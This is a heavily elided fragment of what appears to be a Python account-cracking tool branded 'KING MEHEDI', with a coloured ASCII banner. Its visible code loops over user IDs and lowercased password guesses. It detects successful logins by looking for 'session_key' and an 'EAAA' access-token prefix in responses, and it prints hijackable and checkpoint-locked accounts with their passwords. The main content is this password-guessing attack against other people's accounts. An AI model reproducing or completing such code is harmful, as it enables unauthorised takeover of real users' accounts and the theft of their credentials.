...
\033[92;1m│                 \033[1;37m \033[1;93m\033[1;92m│ 
 ...
 | |\/| |  __| |  __  |  __| | |  | || |  
 | |  | | |____| |  | | |____| |__| || |_ 
 |_|  |_|______|_|  |_|______|_____/_____|
...
\033[92;1m╰───────────────────────────────────────────────────────────╯
\033[92;1m╰───────────────────────────────────────────────────────────╯
 \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m KING MEHEDI }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
   """
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[MEHEDI] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [MEHEDI-CP] %s | %s\033[0;97m         "%(uid, pw))
